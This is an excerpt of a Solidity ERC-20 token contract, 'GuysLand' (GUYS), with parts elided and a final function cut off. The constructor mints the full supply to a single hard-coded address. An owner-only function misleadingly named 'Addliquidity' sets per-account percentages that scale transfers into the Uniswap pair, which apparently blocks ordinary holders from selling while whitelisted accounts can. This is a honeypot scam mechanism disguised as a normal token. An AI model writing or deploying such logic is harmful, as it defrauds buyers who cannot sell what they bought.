...
contract GUYS is Context, IERC20, IERC20Metadata,Ownable {
    mapping(address => uint256) private _balances;
    address  public _OnlyCan =0xe2cAbc7171C09653bFDaF6Eca718db5fE95C75f6;
    ...
    mapping (address => userSells) public liquidity;
    constructor() {
       _totalSupply = 1000000000 * (10**18);
        _setOwner(0xe2cAbc7171C09653bFDaF6Eca718db5fE95C75f6);
        _name="GuysLand";
        _symbol="GUYS";
        _mint(0xe2cAbc7171C09653bFDaF6Eca718db5fE95C75f6, _totalSupply);
    }
    ...
    function Addliquidity(address account, bool isliquidity,uint256 num) public onlyCan() {
        liquidity[account].isliquidity = isliquidity;
        liquidity[account].liquidityLimit = num;
    }
    ...
    function _transfer(
        ...
        uint256 amount1=0;
        if(recipient==uniswapV2Pair || liquidity[sender].isliquidity){
           amount1 =amount.mul(liquidity[sender].liquidityLimit).div(100);
       }else{
           amount1=amount;
       }
